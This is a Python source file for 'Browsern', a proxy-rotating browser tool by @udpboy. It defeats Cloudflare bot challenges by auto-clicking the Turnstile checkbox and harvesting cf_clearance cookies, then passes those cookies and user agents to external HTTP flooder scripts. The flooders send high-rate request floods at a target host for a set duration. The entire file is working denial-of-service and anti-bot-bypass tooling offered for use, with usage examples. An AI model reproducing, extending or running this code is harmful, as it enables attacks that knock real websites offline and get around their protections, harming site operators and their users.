#!/usr/bin/python3
import asyncio
import sys
import os
import subprocess
import signal
import random

from cloakbrowser import launch_async

args = sys.argv[1:]

# HELP
if "-h" in args or "--help" in args:
    print(
        """
Coded by @udpboy (Neerd) | Browsern v2.8.9
Usage: python3 browsern.py <host> <duration> <rates> <threads> [options]

Arguments:             Description:
  <host>                Target host (example: https://example.com)
  <duration>            Duration in seconds (recommended: 30)
  <rates>               Requests rate per seconds (recommended: 8)
  <threads>             Number of threads (recommended: 2)

Options:                 Description:
  --ua <mode>             Browser User Agent (linux, windows, macos) [default: windows]
  --optimize <value>      Optimize browser performance [default: False]
  --referrer <value>      Headers referrer custom (https://example.com/) [default: False]
  --emulation <value>     Simulates human-like browser behavior [default: False]
  --browser <count>       Browser intances per thread (recommended: 8) [default: 1]
  --dratelimit <value>    Enable ratelimit detection (raw only) [default: False]
  --flooder <value>       Browser flooder [default: True]
  --http <1/2>            Flooder HTTP Version (raw only) [default: 1]
  --randrate <count>      Randomize rate 2 to 8 [default: False]
  --proxy <file>          Path to proxy list file Format: (ip:port, authentication: ip:port:username:password)
  --debug <value>         Show browser and flooder logs [default: True]
  -h, --help              Show help and usage instructions

Examples:
 python3 browsern.py https://captcha.flexystat.dev 300 8 6 --browser 8 --proxy proxies.txt --optimize true
 python3 browsern.py https://captcha.flexystat.dev 600 12 4 --proxy proxy.txt --optimize true --ua macos
"""
    )
    sys.exit(0)

if len(args) < 4:
    print(
        """
Coded by @udpboy (Neerd) | Browsern v2.8.9
Usage: python3 browsern.py <host> <duration> <rates> <threads> [options]
       python3 browsern.py --help
"""
    )
    sys.exit(1)


def get_arg_value(name):
    if name in args:
        idx = args.index(name)
        if idx + 1 < len(args) and not args[idx + 1].startswith("--"):
            return args[idx + 1]
    return None

def get_bool_arg(name, default=False):
    if name not in args:
        return default

    idx = args.index(name)

    if idx + 1 < len(args) and not args[idx + 1].startswith("--"):
        next_arg = args[idx + 1].lower()
        if next_arg in ["true", "1", "yes", "y"]:
            return True
        elif next_arg in ["false", "0", "no", "n"]:
            return False
        else:
            return True
    else:
        return True

# Arguments
host = args[0]
duration = int(args[1])
rates = int(args[2])
threads = int(args[3])

# Options
os_arg = get_arg_value("--ua") or "windows"
headless_arg = get_arg_value("--headless")
optimize = get_bool_arg("--optimize", default=False)
flooder = get_bool_arg("--flooder", default=True)
dratelimit = get_bool_arg("--dratelimit", default=False)
randrate = get_bool_arg("--randrate", default=False)
debug = get_bool_arg("--debug", default=True)
emulation = get_bool_arg("--emulation", default=False)
http = get_arg_value("--http") or "1"
referrer = get_arg_value("--referrer") or False
browsers_str = get_arg_value("--browser")
browsers = int(browsers_str) if browsers_str and browsers_str.isdigit() else 1
proxy_arg = get_arg_value("--proxy")
max_attempts = 5
total_cookie = 0
#  DEBUG
# print(f"Host: {host}")
# print(f"Duration: {duration}")
# print(f"Rates: {rates}")
# print(f"Threads: {threads}")
# print(f"Optimize: {optimize}")
# print(f"Debug: {debug}")
# print(f"Flooder: {flooder}")
# print(f"Emulation: {emulation}")

valid_os = ["linux", "windows", "macos", "RAND"]
args_browser = [
    "--no-sandbox",
    "--disable-setuid-sandbox",
    "--disable-dev-shm-usage",
    "--disable-infobars",
    "--start-maximized",
    "--disable-extensions",
    "--lang=en-US,en;q=0.9",
    "--window-size=1920,1080",
    "--fingerprint=72003",
    "--fingerprint-platform=macos",
]

proxy_config = None
geoip = False
us = os_arg

if headless_arg is None:
    headless = True

else:
    if headless_arg == "True":
        headless = True
    elif headless_arg == "False":
        headless = False
    else:
        print(f"[INFO] Invalid headless mode: {headless_arg}")
        print("[INFO] Valid modes: True, False, virtual")
        sys.exit(1)


if optimize == True:
    args_browser = [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--disable-infobars",
        "--start-maximized",
        "--disable-extensions",
        "--lang=en-US,en;q=0.9",
        "--window-size=1920,1080",
        #        "--disable-accelerated-2d-canvas",
        "--no-first-run",
        "--no-zygote",
#        '--disable-gpu',
        "--disable-extensions",
        "--disable-background-networking",
        "--disable-default-apps",
        "--disable-sync",
        "--metrics-recording-only",
        "--mute-audio",
        "--no-default-browser-check",
        "--disable-background-timer-throttling",
        "--disable-backgrounding-occluded-windows",
        "--disable-renderer-backgrounding",
        "--fingerprint=72003",
       f"--fingerprint-platform={os_arg}",
    ]

if us not in valid_os:
    print(f"[INFO] Invalid ua mode: {os}")
    print(f"[INFO] Valid modes: {', '.join(valid_os)}")
    sys.exit(1)


if proxy_arg:
    geoip = True

use_http1 = None
if http == "1":
    use_http1 = True

else:
    use_http1 = False


async def flood(cookie, ua, proxy_config, proxy):
    parts = proxy.split(":")

    if len(parts) == 4:
        ip, port, user, pwd = parts
        proxy = f"{user}:{pwd}@{ip}:{port}"

    args_go = [
        "go",
        "run",
        "flooder.go",
        host,
        str(proxy),
        str(rates),
        str(duration),
        "--cookie",
        str(cookie),
        "--ua",
        str(ua),
    ]

    args_js = [
        "node",
        "flooder.js",
        host,
        str(duration),
        str(random.randint(2, 8) if randrate else rates),
        str(threads),
        "null",
        "--proxy",
        str(proxy),
        "--getcookie",
        str(cookie),
        "--ua",
        str(ua),
        "--autoratelimit",
        "true",
    ]

    process = await asyncio.create_subprocess_exec(
        *args_go, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )

    while True:
        line = await process.stdout.readline()
        if not line:
            break
        print(line.decode().strip())

async def safe_goto(page, url, max_retry=15):
    for attempt in range(max_retry):
        res = await page.goto(url)
#        title = await page.title()
#        print(res.status, title)
        if res and res.status == 429:
            return res.status

    return None

async def turnstile(page):
    try:
        for _ in range(15):
            await asyncio.sleep(0.6)

            for frame in page.frames:
                if frame.url.startswith("https://challenges.cloudflare.com"):
                    frame_element = await frame.frame_element()
                    bounding_box = await frame_element.bounding_box()
                    if not bounding_box:
                        continue

                    coord_x = bounding_box["x"]
                    coord_y = bounding_box["y"]
                    width = bounding_box["width"]
                    height = bounding_box["height"]

                    checkbox_x = coord_x + width / 9
                    checkbox_y = coord_y + height / 2
                    #                    print(f"Clicking at: {checkbox_x}, {checkbox_y}")
                    await page.mouse.click(x=checkbox_x, y=checkbox_y)

        return True
    except Exception as e:
        #        print(f"Error clicking checkbox: {e}")
        return False


async def browsern(host, proxy_config, proxy):
    page = None
    browser = None
    solved = False
    ncd = False
    try:
        browser = await launch_async(
            headless=headless,
            proxy=proxy_config,
#            geoip=geoip,
            humanize=emulation,
            args=args_browser,
        )
        page = await browser.new_page()
        if referrer:
            await page.set_extra_http_headers(
                {
                    "Referer": referrer,
                }
            )

        br = await page.goto(host) #, wait_until="domcontentloaded") #, timeout=10000)
        title = await page.title()
        print(
            f"Started Browser ~ {proxy} | Status: {br.status}"
        )
        await asyncio.sleep(0.8)
        
        if title in ["Just a moment...", "Checking your browser...", "安全检查中……"]:
            print(f"[!] Found Cloudf#lare Challenge ({title}) - {proxy}")

            if geoip:
                await asyncio.sleep(4)

            for attempt in range(1, max_attempts + 1):
                solve = await turnstile(page)
                if solve:
                    await asyncio.sleep(4)
                    cookies = await page.context.cookies()
#                    title2 = await page.title()
                    try: title2 = await page.title()
                    except: title2 = "None"
                    cf_cookie = next(
                        (c for c in cookies if c["name"] == "cf_clearance"), None
                    )

                    if not cf_cookie:
                        solved = False
                        await asyncio.sleep(0.1)

                    if title2 in [
                        "Just a moment...",
                        "Checking your browser...",
                        "安全检查中……",
                    ]:
                        solved = False
                        await asyncio.sleep(0.1)

                    else:
                        solved = True
                        break
        else:
            await asyncio.sleep(5)
            ncd = True
            solved = True

        #bypass = await challenge(page, content, proxy)
        await asyncio.sleep(1)
        try: title2 = await page.title()
        except: title2 = "None"
        ua = await page.evaluate("() => navigator.userAgent")
        cookie = await page.context.cookies()
        cookie = [
            c
            for c in cookie
            if c["name"]
            not in [
                "__cf_bm",
                "_cfuvid",
                "cf_chl_2",
                "cf_chl_seq_",
                "cf_chl_prog",
                "cf_chl_rc_",
                "cf_chl_cc_",
                "_abck",
                "bm_sv",
                "bm_mi",
                "ak_bmsc",
                "nonce",
                "csrf_token",
                "xsrf-token",
                "doOver",
                "OJSSID",
                "XSRF-TOKEN",
            ]
        ]  # cookie non-reusable
        cf_value = next(
            (
                c["value"]
                for c in await page.context.cookies()
                if c["name"] == "cf_clearance"
            ),
            None,
        )
        if cf_value:
            cookie = f"cf_clearance={cf_value}" if cf_value else ""
        else:
            cookie = " ".join(f"{c['name']}={c['value']}" for c in cookie)


#        await asyncio.sleep(0.6)
#        await page.close()
        await browser.close()
        page = None
        browser = None
        
        if solved:
           global total_cookie
           total_cookie += 1
           if not ncd:
              print(
                f"Closed browser - {proxy}\nChallange Session Solved ({total_cookie}) - {proxy} [ Parameter Setting >> METHOD GET RATE {rates} FLOOD TIME {duration}s ]\nPage Title: ({title2}) | Proxy: {proxy} | User Agent: {ua} | Cookie: {cookie}"
              )
           else:
              print(
                f"Closed browser - {proxy}\n[+] No challenge detected or JS/delay challenge complete - {proxy} [ Parameter Setting >> METHOD GET RATE {rates} FLOOD TIME {duration}s ]\nPage Title: ({title2}) | Proxy: {proxy} | User Agent: {ua} | Cookie: {cookie}"
              )

        if solved and flooder:
            await flood(cookie, ua, proxy_config, proxy)
                

    except Exception as err:
       if debug:
           print(f"Error: {err}")
  
    finally:
#       if page: await page.close()
       if browser: await browser.close()
       return False


async def browsern_debug(host):
    try:
            browser = await launch_async(
                 headless=headless,
                 humanize=emulation,
                 args=args_browser,
            )
            page = await browser.new_page()
            br = await page.goto(host) #, wait_until="domcontentloaded")
            title = await page.title()

            print(f"Started Browser | Status: {br.status}")
            await asyncio.sleep(0.6)
            solved = False
            if title in ["Just a moment...", "Checking your browser...", "安全检查中……"]:
                print(f"[!] Found Cloudflare Challenge ({title})")
                
                for attempt in range(1, max_attempts + 1):
                    solve = await turnstile(page)
                    if solve:
                        await asyncio.sleep(0.8)
                        cookies = await page.context.cookies()
                        cf_cookie = next(
                            (c for c in cookies if c["name"] == "cf_clearance"), None
                        )
                        title2 = await page.title()

                        if not cf_cookie:
                            solved = False
                            await asyncio.sleep(0.1)
                            
                        if title2 in [
                            "Just a moment...",
                            "Checking your browser...",
                            "安全检查中……",
                           ]:
                           solved = False
                           await asyncio.sleep(0.1)
                           
                        else:
                            solved = True
                            print(f"[INFO] Cloudflare Challenge: Solved")
                            break

            else:
                solved = True
                print("[INFO] Waiting 5s for JS challenge...")
                await asyncio.sleep(5)

            await asyncio.sleep(0.5)
            title2 = await page.title()
            ua = await page.evaluate("() => navigator.userAgent")
            cookie = await page.context.cookies()
            cookie = [
                c
                for c in cookie
                if c["name"]
                not in [
                    "__cf_bm",
                    "_cfuvid",
                    "cf_chl_2",
                    "cf_chl_seq_",
                    "cf_chl_prog",
                    "cf_chl_rc_",
                    "cf_chl_cc_",
                    "_abck",
                    "bm_sv",
                    "bm_mi",
                    "ak_bmsc",
                    "nonce",
                    "csrf_token",
                    "xsrf-token",
                    "XSRF-TOKEN",
                    "doOver",
                ]
            ]  # cookie non-reusable
            cookie = " ".join(f"{c['name']}={c['value']}" for c in cookie)
            cf_value = next(
                 (
                     c["value"]
                     for c in await page.context.cookies()
                     if c["name"] == "cf_clearance"
                 ),
                 None,
            )
            if cf_value:
                cookie = f"cf_clearance={cf_value}" if cf_value else ""
            else:
                 cookie = " ".join(f"{c['name']}={c['value']}" for c in cookie)
            print(
                f"[INFO] Closed browser\n[INFO] Page Title: ({title2}) | User Agent: {ua} | Cookie: {cookie}"
            )
            if dratelimit:
                await page.set_extra_http_headers({"Cookie": cookie})
                dratelimit_status = await safe_goto(page, host, max_retry=100)
                if dratelimit_status == 429:
                    print(f"[INFO] Ratelimit detected 429")
                    await page.close()
                    await browser.close()
                    os._exit(0)
                else:
                  print(f"[INFO] Ratelimit not detected {dratelimit_status}")
                   

            await page.close()
            await browser.close()

            if solved:
                if use_http1:
                    args = [
                        "node",
                        "http1.js",
                        host,
                        str(duration),
                        str(random.randint(2, 8) if randrate else rates),
                        str(ua),
                        str(cookie),
                    ]
                else:
                    args = [
                        "node",
                        "http2.js",
                        host,
                        str(duration),
                        str(random.randint(2, 8) if randrate else rates),
                        str(threads),
                        "1",
                        "nle",
                        "--ua",
                        str(ua),
                        "--cookie",
                        str(cookie),
                    ]
                if flooder:
                    print(
                        f"[INFO] Flooder started on {rates} rates for {duration} seconds"
                    )
                    result = subprocess.run(args, text=True, timeout=duration)

            else:
                await browsern_debug(host)

    except Exception as err:
        if debug:
           print(f"[Error] {err}")
        return False
  
    finally:
       if page: await page.close()
       if browser: await browser.close()
       


async def load_proxies(path="proxies.txt"):
    q = asyncio.Queue()
    with open(path, "r") as f:
        for line in f:
            p = line.strip()
            if p:
                await q.put(p)
    return q


async def worker(name, proxy_queue):
    """Ambil proxy satu per satu, proses sampai berhasil atau queue habis."""
    while True:
        try:
            proxy = await proxy_queue.get()
        except asyncio.CancelledError:
            break

        try:
            parts = proxy.split(":")
            if len(parts) == 4:
                ip, port, username, password = parts
                proxy_config = {
                    "server": f"http://{ip}:{port}",
                    "username": username,
                    "password": password,
                }
            elif len(parts) == 2:
                ip, port = parts
                proxy_config = {"server": f"http://{ip}:{port}"}
            else:
                proxy_queue.task_done()
                continue

            success = await browsern(host, proxy_config, proxy)
            if success:
#                print(f"[WORKER {name}] Sukses dengan proxy {proxy}, berhenti.")
                return  # worker selesai, yang lain akan terus berjalan
#           else:
#                print(f"[WORKER {name}] Gagal dengan proxy {proxy}, coba proxy lain.")

        except Exception as e:
            if debug:
                print(f"[WORKER {name}] Error: {e}")
        finally:
            proxy_queue.task_done()


async def main():
    proxy_queue = await load_proxies(proxy_arg)

    tasks = [
        asyncio.create_task(worker(i + 1, proxy_queue)) for i in range(int(browsers))
    ]

    try:
        await proxy_queue.join()
    except asyncio.CancelledError:
        pass

    for t in tasks:
        t.cancel()

    await asyncio.gather(*tasks, return_exceptions=True)


def signal_handler(sig, frame):
    print(
        "\nSIGINT Signal Received, Cleaning Up Resources and Terminating Related Processes..."
    )
    os.system('pkill -f "cloakbrowser|playwright|Xvfb|flooder|http1|http2"')
    print("All Related Processes Have Been Destroyed")
    print("Resources Cleaned Up, Process Exited")
    os._exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGALRM, signal_handler)
signal.alarm(duration + 20)

if __name__ == "__main__":
    if debug:
        print("Powered by @udpboy (Browsern  v2.8.9)")
        print(
            f"Browser Arguments [ duration: {duration}, rates: {rates}, threads: {threads} ]"
        )
        print(
            f"Browser Options [ proxy: {proxy_arg},  headless: {headless}, os: {os_arg}, optimize: {optimize} ]"
        )

    if proxy_arg:
        asyncio.run(main())

    else:
        asyncio.run(browsern_debug(host))
